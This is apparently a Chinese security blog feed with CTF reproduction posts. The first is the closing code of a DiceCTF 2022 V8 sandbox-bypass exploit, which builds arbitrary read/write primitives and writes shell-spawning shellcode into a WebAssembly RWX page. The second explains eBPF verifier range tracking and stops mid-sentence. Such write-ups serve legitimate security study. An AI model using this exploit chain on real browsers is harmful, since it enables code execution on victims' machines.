<span class="title function_">addressOf</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">    leak[<span class="string">&#x27;obj&#x27;</span>] = obj;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">find_leak_offset</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fake_mutable_globals_offset = <span class="title function_">addressOf</span>(fake_mutable_globals)</span><br><span class="line"><span class="keyword">if</span> (fake_mutable_globals_offset &amp;&amp; fake_mutable_globals_elements_arr_idx) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] fake_mutable_globals_offset =&gt; &quot;</span> + <span class="title function_">hex</span>(fake_mutable_globals_offset));</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] fake_mutable_globals_elements_arr_idx =&gt; &quot;</span> + <span class="title function_">hex</span>(fake_mutable_globals_elements_arr_idx));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// !!!</span></span><br><span class="line"><span class="keyword">var</span> arr_in_fake_mutable_globals_addr = fake_mutable_globals_offset - <span class="number">9</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] arr_in_fake_mutable_globals_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(arr_in_fake_mutable_globals_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> vuln_addr = <span class="title function_">addressOf</span>(vuln_arr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] vuln_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(vuln_addr));</span><br><span class="line"><span class="keyword">var</span> vuln_elements_addr = vuln_addr - <span class="number">1</span> - <span class="number">0x18</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] vuln_elements_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(vuln_elements_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmInstanceAddr = <span class="title function_">addressOf</span>(wasmInstance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] wasmInstanceAddr =&gt; &quot;</span> + <span class="title function_">hex</span>(wasmInstanceAddr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> imported_mutable_globals_addr = wasmInstanceAddr - <span class="number">1</span> + <span class="number">0x50</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] imported_mutable_globals_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(imported_mutable_globals_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> split = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// modify imported_mutable_globals =&gt; arr_in_fake_mutable_globals_addr</span></span><br><span class="line"><span class="keyword">var</span> imported_mutable_globals_index = (imported_mutable_globals_addr - vuln_elements_addr) / <span class="number">8</span>;</span><br><span class="line"><span class="keyword">if</span> (imported_mutable_globals_index % <span class="number">1</span> == <span class="number">0.5</span>) &#123;</span><br><span class="line">    imported_mutable_globals_index = imported_mutable_globals_index - <span class="number">0.5</span>;</span><br><span class="line">    split = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] imported_mutable_globals_index =&gt; &quot;</span> + imported_mutable_globals_index);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr_in_fake_mutable_globals_index = (arr_in_fake_mutable_globals_addr - vuln_elements_addr) / <span class="number">8</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] arr_in_fake_mutable_globals_index =&gt; &quot;</span> + arr_in_fake_mutable_globals_index);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> target_addr = js_base + arr_in_fake_mutable_globals_addr;</span><br><span class="line"><span class="keyword">if</span> (!split)</span><br><span class="line">    vuln_arr[imported_mutable_globals_index] = <span class="title function_">u2d</span>(target_addr);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[!] split!!!&quot;</span>);</span><br><span class="line">    <span class="title function_">d22u</span>(vuln_arr[imported_mutable_globals_index + <span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">var</span> pad1 = __dvCvt.<span class="title function_">getUint32</span>(<span class="number">4</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">var</span> high = js_base / <span class="number">0x100000000</span> <span class="comment">// + (pad1 * 0x100000000);</span></span><br><span class="line">    vuln_arr[imported_mutable_globals_index] = <span class="title function_">u2d</span>(arr_in_fake_mutable_globals_addr * <span class="number">0x100000000</span>);</span><br><span class="line">    vuln_arr[imported_mutable_globals_index + <span class="number">1</span>] = <span class="title function_">u2d</span>(high);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    fake_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">getGlobal</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line">    fake_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="title function_">setGlobal</span>(<span class="title class_">BigInt</span>(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode1 = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>,</span><br><span class="line">    <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>,</span><br><span class="line">    <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">65</span>, <span class="number">42</span>, <span class="number">11</span>,</span><br><span class="line">]);</span><br><span class="line"><span class="keyword">var</span> wasm2 = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode1);</span><br><span class="line"><span class="keyword">var</span> wasmInstance_attack = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm2);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance_attack.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmInstance_attack_addr = <span class="title function_">addressOf</span>(wasmInstance_attack);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] wasmInstance_attack_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(wasmInstance_attack_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> rwx_offset = wasmInstance_attack_addr + <span class="number">0x60</span> - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_addr = <span class="title function_">arbRead</span>(rwx_offset + js_base);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] rwx_addr =&gt; &quot;</span> + <span class="title function_">hex</span>(rwx_addr));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">0xb848686a</span>, <span class="number">0x6e69622f</span>, <span class="number">0x7361622f</span>, <span class="number">0xe7894850</span>, <span class="number">0xb848686a</span>, <span class="number">0x6e69622f</span>, <span class="number">0x7361622f</span>, <span class="number">0x56f63150</span>, <span class="number">0x485e086a</span>, <span class="number">0x4856e601</span>, <span class="number">0xd231e689</span>, <span class="number">0xf583b6a</span>, <span class="number">0x90909005</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbWrite</span>(<span class="title function_">b2u</span>(rwx_addr) + i * <span class="number">4</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// %DebugPrint(vuln_arr);</span></span><br><span class="line"><span class="comment">// %DebugPrint(wasmInstance);</span></span><br><span class="line"><span class="comment">// %SystemBreak();</span></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>

<p>文中如有错误和疑问，还望及时交流探讨。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html#">Dice CTF Memory Hole: Breaking V8 Heap Sandbox (mem2019.github.io)</a></li>
<li>[<a href="https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole/">DiceCTF 2022] - memory hole | kylebot’s Blog</a></li>
<li><a href="https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8/edit#heading=h.xzptrog8pyxf">V8 Sandbox - High-Level Design Doc - Google 文档</a></li>
<li><a href="https://tttang.com/archive/1443/#toc_0x01">V8 沙箱绕过 - 跳跳糖 (tttang.com)</a></li>
</ol>
]]></content>
      <categories>
        <category>题目复现</category>
      </categories>
      <tags>
        <tag>V8</tag>
        <tag>sandbox</tag>
      </tags>
  </entry>
  <entry>
    <title>ebpf的利用</title>
    <url>/2022/12/10/ebpf%E7%9A%84%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<p>本文记录跟随 <a href="https://pawnyable.cafe/linux-kernel/LK06/exploit.html">ptr-yudai PAWNYABLE</a> 学习的 ebpf 相关内容。</p>
<span id="more"></span>

<h1 id="verifier"><a href="#verifier" class="headerlink" title="verifier"></a>verifier</h1><p>ebpf 的 verifier 对指令的检查主要分为两个阶段，其中第二个阶段会针对所有寄存器的值追踪其类型和范围，如下的情况将不会通过检查：</p>
<ul>
<li>使用未初始化的寄存器</li>
<li>返回内核空间的指针</li>
<li>讲内核空间的指针写到 BPF 映射上</li>
<li>非法的指针读写</li>
</ul>
<p>其中对于寄存器常量的跟踪是基于范围的跟踪。对于每个寄存器，记录其在该时间节点上取值的最大值和最小值。这一点和 v8 很像。例如 R0 +&#x3D; R1，R0 与 R1 分别取 [10, 20]，[-2, 2]，那么经过计算后的 R0 的值的范围就是 [8, 22]。这种行为在 <code>adjust_reg_min_max_vals</code> 和 <code>adjust_scalar_min_max_vals</code> 函数中定义。</p>
<blockquote>
<p>在不知道具体数值的分析过程中，常常在抽象的范围内推断出数值。如果你不以合理的方式进行抽象，解释的结果可能是错误的。v8 中的很多漏洞也都是由于推断优化出现错误，进而导致 oob 等。</p>
</blockquote>
<p>对于数值范围的跟踪，verifier 为每个寄存器保留并跟踪以下的数值：</p>
<table>
<thead>
<tr>
<th align="center">变量</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">umin_value, umax_value</td>
<td align="center">64位无符号整数的最小值和最大值</td>
</tr>
<tr>
<td align="center">smin_value, smax_value</td>
<td align="center">64位有符号整数的最小值和最大值</td>
</tr>
<tr>
<td align="center">u32_min_value, u32_max_value</td>
<td align="center">32位无符号整数的最小值和最大值</td>
</tr>
<tr>
<td align="center">s32_min_value, s32_max_value</td>
<td align="center">32位有符号整数的最小值和最大值</td>
</tr>
<tr>
<td align="center">var_off</td>
<td align="center">寄存器中每个位的信息（已知具体数值的位）</td>
</tr>
</tbody></table>
<p>var_off 是一个叫做 tnum 的结构，它包括一个 mask 和一个 value。mask 是值未知的比特的位置，而值是已知比特位置的值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> &#123;</span></span><br><span class="line">	u64 value;</span><br><span class="line">	u64 mask;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>例如从一个 BPF 映射中取一个 64 位的值，最初所有位都是未知的，所以 var_off 是：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(mask=<span class="number">0xffffffffffffffff</span>; value=<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure>

<p>下面的例子是将 0xffff0000 与上述寄存器按位与，与 0 相与的部分为 0，所以：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(mask=<span class="number">0xffff0000</span>; value=<span class="number">0x0</span>)</span><br></pre></td></tr></table></figure>

<p>如果此时再相加 0x12345，由于低十六位已知为 0：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">(mask=<span class="number">0x1ffff0000</span>; value=<span class="number">0x2345</span>)</span><br></pre></td></tr></table></figure>

<p>这将是一种情况。 请注意，mask 已经增加了一个，以考虑到进位的可能性（不知道这么理解对不对）。 此时的umin_value、umax_value、u32_min_value 和 u32_max_value 分别为 0x1ffff0000、0x1ffff2345、0xffff0000和0xffff2345。</p>
<p>现在看具体实现，在 BPF_ADD 的情况下，寄存器被更新如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> BPF_ADD:</span><br><span class="line">	scalar32_min_max_add(dst_reg, &amp;src_reg);</span><br><span class="line">	scalar_min_max_add(dst_reg, &amp;src_reg);</span><br><span class="line">	dst_reg-&gt;var_off = tnum_add(dst_reg-&gt;var_off, src_reg.var_off);</span><br><span class="line">	<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>在scalar_min_max_add中，考虑到整数溢出等因素，通过范围计算实现，具体如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">scalar_min_max_add</span><span class="params">(<span class="keyword">struct</span> bpf_reg_state *dst_reg,</span></span><br><span class="line"><span class="params">			       <span class="keyword">struct</span> bpf_reg_state *src_reg)</span></span><br><span class="line">&#123;</span><br><span class="line">	s64 smin_val = src_reg-&gt;smin_value;</span><br><span class="line">	s64 smax_val = src_reg-&gt;smax_value;</span><br><span class="line">	u64 umin_val = src_reg-&gt;umin_value;</span><br><span class="line">	u64 umax_val = src_reg-&gt;umax_value;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (signed_add_overflows(dst_reg-&gt;smin_value, smin_val) ||</span><br><span class="line">	    signed_add_overflows(dst_reg-&gt;smax_value, smax_val)) &#123;</span><br><span class="line">		dst_reg-&gt;smin_value = S64_MIN;</span><br><span class="line">		dst_reg-&gt;smax_value = S64_MAX;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		dst_reg-&gt;smin_value += smin_val;</span><br><span class="line">		dst_reg-&gt;smax_value += smax_val;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (dst_reg-&gt;umin_value + umin_val &lt; umin_val ||</span><br><span class="line">	    dst_reg-&gt;umax_value + umax_val &lt; umax_val) &#123;</span><br><span class="line">		dst_reg-&gt;umin_value = <span class="number">0</span>;</span><br><span class="line">		dst_reg-&gt;umax_value = U64_MAX;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		dst_reg-&gt;umin_value += umin_val;</span><br><span class="line">		dst_reg-&gt;umax_value += umax_val;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<details class="note "><summary><p>这是 <code>struct bpf_reg_state </code>的结构</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> &#123;</span></span><br><span class="line">	<span class="comment">/* Ordering of fields matters.  See states_equal() */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_type</span> <span class="title">type</span>;</span></span><br><span class="line">	<span class="comment">/* Fixed part of pointer offset, pointer types only */</span></span><br><span class="line">	s32 off;</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="comment">/* valid when type == PTR_TO_PACKET */</span></span><br><span class="line">		<span class="type">int</span> range;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* valid when type == CONST_PTR_TO_MAP | PTR_TO_MAP_VALUE |</span></span><br><span class="line"><span class="comment">		 *   PTR_TO_MAP_VALUE_OR_NULL</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map_ptr</span>;</span></span><br><span class="line">			<span class="comment">/* To distinguish map lookups from outer map</span></span><br><span class="line"><span class="comment">			 * the map_uid is non-zero for registers</span></span><br><span class="line"><span class="comment">			 * pointing to inner maps.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			u32 map_uid;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* for PTR_TO_BTF_ID */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">btf</span> *<span class="title">btf</span>;</span></span><br><span class="line">			u32 btf_id;</span><br><span class="line">		&#125;;</span><br><span class="line"></span><br><span class="line">		u32 mem_size; <span class="comment">/* for PTR_TO_MEM | PTR_TO_MEM_OR_NULL */</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* Max size from any of the above. */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> raw1;</span><br><span class="line">			<span class="type">unsigned</span> <span class="type">long</span> raw2;</span><br><span class="line">		&#125; raw;</span><br><span class="line"></span><br><span class="line">		u32 subprogno; <span class="comment">/* for PTR_TO_FUNC */</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="comment">/* For PTR_TO_PACKET, used to find other pointers with the same variable</span></span><br><span class="line"><span class="comment">	 * offset, so they can share range knowledge.</span></span><br><span class="line"><span class="comment">	 * For PTR_TO_MAP_VALUE_OR_NULL this is used to share which map value we</span></span><br><span class="line"><span class="comment">	 * came from, when one is tested for != NULL.</span></span><br><span class="line"><span class="comment">	 * For PTR_TO_MEM_OR_NULL this is used to identify memory allocation</span></span><br><span class="line"><span class="comment">	 * for the purpose of tracking that it&#x27;s freed.</span></span><br><span class="line"><span class="comment">	 * For PTR_TO_SOCKET this is used to share which pointers retain the</span></span><br><span class="line"><span class="comment">	 * same reference to the socket, to determine proper reference freeing.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32 id;</span><br><span class="line">	<span class="comment">/* PTR_TO_SOCKET and PTR_TO_TCP_SOCK could be a ptr returned</span></span><br><span class="line"><span class="comment">	 * from a pointer-cast helper, bpf_sk_fullsock() and</span></span><br><span class="line"><span class="comment">	 * bpf_tcp_sock().</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * Consider the following where &quot;sk&quot; is a reference counted</span></span><br><span class="line"><span class="comment">	 * pointer returned from &quot;sk = bpf_sk_lookup_tcp();&quot;:</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * 1: sk = bpf_sk_lookup_tcp();</span></span><br><span class="line"><span class="comment">	 * 2: if (!sk) &#123; return 0; &#125;</span></span><br><span class="line"><span class="comment">	 * 3: fullsock = bpf_sk_fullsock(sk);</span></span><br><span class="line"><span class="comment">	 * 4: if (!fullsock) &#123; bpf_sk_release(sk); return 0; &#125;</span></span><br><span class="line"><span class="comment">	 * 5: tp = bpf_tcp_sock(fullsock);</span></span><br><span class="line"><span class="comment">	 * 6: if (!tp) &#123; bpf_sk_release(sk); return 0; &#125;</span></span><br><span class="line"><span class="comment">	 * 7: bpf_sk_release(sk);</span></span><br><span class="line"><span class="comment">	 * 8: snd_cwnd = tp-&gt;snd_cwnd;  // verifier will complain</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * After bpf_sk_release(sk) at line 7, both &quot;fullsock&quot; ptr and</span></span><br><span class="line"><span class="comment">	 * &quot;tp&quot; ptr should be invalidated also.  In order to do that,</span></span><br><span class="line"><span class="comment">	 * the reg holding &quot;fullsock&quot; and &quot;sk&quot; need to remember</span></span><br><span class="line"><span class="comment">	 * the original refcounted ptr id (i.e. sk_reg-&gt;id) in ref_obj_id</span></span><br><span class="line"><span class="comment">	 * such that the verifier can reset all regs which have</span></span><br><span class="line"><span class="comment">	 * ref_obj_id matching the sk_reg-&gt;id.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * sk_reg-&gt;ref_obj_id is set to sk_reg-&gt;id at line 1.</span></span><br><span class="line"><span class="comment">	 * sk_reg-&gt;id will stay as NULL-marking purpose only.</span></span><br><span class="line"><span class="comment">	 * After NULL-marking is done, sk_reg-&gt;id can be reset to 0.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * After &quot;fullsock = bpf_sk_fullsock(sk);&quot; at line 3,</span></span><br><span class="line"><span class="comment">	 * fullsock_reg-&gt;ref_obj_id is set to sk_reg-&gt;ref_obj_id.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * After &quot;tp = bpf_tcp_sock(fullsock);&quot; at line 5,</span></span><br><span class="line"><span class="comment">	 * tp_reg-&gt;ref_obj_id is set to fullsock_reg-&gt;ref_obj_id</span></span><br><span class="line"><span class="comment">	 * which is the same as sk_reg-&gt;ref_obj_id.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * From the verifier perspective, if sk, fullsock and tp</span></span><br><span class="line"><span class="comment">	 * are not NULL, they are the same ptr with different</span></span><br><span class="line"><span class="comment">	 * reg-&gt;type.  In particular, bpf_sk_release(tp) is also</span></span><br><span class="line"><span class="comment">	 * allowed and has the same effect as bpf_sk_release(sk).</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32 ref_obj_id;</span><br><span class="line">	<span class="comment">/* For scalar types (SCALAR_VALUE), this represents our knowledge of</span></span><br><span class="line"><span class="comment">	 * the actual value.</span></span><br><span class="line"><span class="comment">	 * For pointer types, this represents the variable part of the offset</span></span><br><span class="line"><span class="comment">	 * from the pointed-to object, and is shared with all bpf_reg_states</span></span><br><span class="line"><span class="comment">	 * with the same id as us.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tnum</span> <span class="title">var_off</span>;</span></span><br><span class="line">	<span class="comment">/* Used to determine if any memory access using this register will</span></span><br><span class="line"><span class="comment">	 * result in a bad access.</span></span><br><span class="line"><span class="comment">	 * These refer to the same value as var_off, not necessarily the actual</span></span><br><span class="line"><span class="comment">	 * contents of the register.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s64 smin_value; <span class="comment">/* minimum possible (s64)value */</span></span><br><span class="line">	s64 smax_value; <span class="comment">/* maximum possible (s64)value */</span></span><br><span class="line">	u64 umin_value; <span class="comment">/* minimum possible (u64)value */</span></span><br><span class="line">	u64 umax_value; <span class="comment">/* maximum possible (u64)value */</span></span><br><span class="line">	s32 s32_min_value; <span class="comment">/* minimum possible (s32)value */</span></span><br><span class="line">	s32 s32_max_value; <span class="comment">/* maximum possible (s32)value */</span></span><br><span class="line">	u32 u32_min_value; <span class="comment">/* minimum possible (u32)value */</span></span><br><span class="line">	u32 u32_max_value; <span class="comment">/* maximum possible (u32)value */</span></span><br><span class="line">	<span class="comment">/* parentage chain for liveness checking */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_reg_state</span> *<span class="title">parent</span>;</span></span><br><span class="line">	<span class="comment">/* Inside the callee two registers can be both PTR_TO_STACK like</span></span><br><span class="line"><span class="comment">	 * R1=fp-8 and R2=fp-8, but one of them points to this function stack</span></span><br><span class="line"><span class="comment">	 * while another to the caller&#x27;s stack. To differentiate them &#x27;frameno&#x27;</span></span><br><span class="line"><span class="comment">	 * is used which is an index in bpf_verifier_state-&gt;frame[] array</span></span><br><span class="line"><span class="comment">	 * pointing to bpf_func_state.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32 frameno;</span><br><span class="line">	<span class="comment">/* Tracks subreg definition. The stored value is the insn_idx of the</span></span><br><span class="line"><span class="comment">	 * writing insn. This is safe because subreg_def is used before any insn</span></span><br><span class="line"><span class="comment">	 * patching which only happens after main verification finished.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	s32 subreg_def;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">bpf_reg_liveness</span> <span class="title">live</span>;</span></span><br><span class="line">	<span class="comment">/* if (!precise &amp;&amp; SCALAR_VALUE) min/max/tnum don&#x27;t affect safety */</span></span><br><span class="line">	<span class="type">bool</span> precise;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</details>

<p>这样的更新过程是针对所有操作实现的。32&#x2F;64 位的加减乘除、移位等。计算值的范围用于检查偏移量是否落在了堆栈和上下文等内存访问的范围内。</p>
<p>例如，堆栈的范围检查在 <a href="https://elixir.bootlin.com/linux/v5.18.11/source/kernel/bpf/verifier.c#L4315">check_stack_access_within_bounds</a> 中定义，如果已知该值恒定，也就是立即数的情况下，就进行正常的偏移量检查。如果不知道具体数值，就检查偏移量可能用的最大值和最小值：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Returns true if @a is a known constant */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">tnum_is_const</span><span class="params">(<span class="keyword">struct</span> tnum a)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> !a.mask;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check that the stack access at &#x27;regno + off&#x27; falls within the maximum stack</span></span><br><span class="line"><span class="comment"> * bounds.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &#x27;off&#x27; includes `regno-&gt;offset`, but not its dynamic part (if any).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">check_stack_access_within_bounds</span><span class="params">(···)</span> &#123;</span><br><span class="line">    ···</span><br><span class="line">    <span class="keyword">if</span> (tnum_is_const(reg-&gt;var_off)) &#123;</span><br><span class="line">        min_off = reg-&gt;var_off.value + off;</span><br><span class="line">        <span class="keyword">if</span> (access_size &gt; <span class="number">0</span>)</span><br><span class="line">            max_off = min_off + access_size - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            max_off = min_off;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (reg-&gt;smax_value &gt;= BPF_MAX_VAR_OFF ||</span><br><span class="line">            reg-&gt;smin_value &lt;= -BPF_MAX_VAR_OFF) &#123;</span><br><span class="line">            verbose(env, <span class="string">&quot;invalid unbounded variable-offset%s stack R%d\n&quot;</span>,</span><br><span class="line">                    err_extra, regno);</span><br><span class="line">            <span class="keyword">return</span> -EACCES;</span><br><span class="line">        &#125;</span><br><span class="line">        min_off = reg-&gt;smin_value + off;</span><br><span class="line">        <span class="keyword">if</span> (access_size &gt; <span class="number">0</span>)</span><br><span class="line">            max_off = reg-&gt;smax_value + off + access_size - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            max_off = min_off;</span><br><span class="line">    &#125;</span><br><span class="line">    ···</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后得到的值就会被用作范围检查，先检查最小值是否越界，再检查最大值：</p>
